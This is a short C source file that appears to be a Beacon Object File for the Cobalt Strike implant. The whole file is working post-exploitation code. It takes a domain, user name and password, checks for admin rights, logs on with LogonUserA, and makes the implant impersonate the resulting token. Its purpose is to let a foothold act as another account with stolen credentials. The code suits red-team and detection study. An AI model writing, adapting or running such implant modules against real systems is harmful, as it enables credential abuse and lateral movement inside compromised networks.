#include <windows.h>
#include "beacon.h"

WINADVAPI WINBOOL WINAPI ADVAPI32$LogonUserA (LPCSTR lpszUsername, LPCSTR lpszDomain, LPCSTR lpszPassword, DWORD dwLogonType, DWORD dwLogonProvider, PHANDLE phToken);
WINBASEAPI WINBOOL WINAPI KERNEL32$CloseHandle (HANDLE hObject);
WINBASEAPI DWORD WINAPI KERNEL32$GetLastError (VOID);

void go(char * buff, int len) {
	HANDLE	hToken;
	datap	parser;
	char * domain;
	char * user;
	char * pass;

	BeaconDataParse(&parser, buff, len);
	domain = BeaconDataExtract(&parser, NULL);
	user = BeaconDataExtract(&parser, NULL);
	pass = BeaconDataExtract(&parser, NULL);

	if (!BeaconIsAdmin ()) {
		BeaconPrintf(CALLBACK_ERROR, "You must be admin to use this!");
		return;
	}

	if (ADVAPI32$LogonUserA(user, domain, pass, LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &hToken)) {
		BeaconUseToken (hToken);
		BeaconPrintf(CALLBACK_OUTPUT, "Success!");
		KERNEL32$CloseHandle(hToken);
	}
	else {
		BeaconPrintf(CALLBACK_ERROR, "Failed: %d", KERNEL32$GetLastError());
	}

}
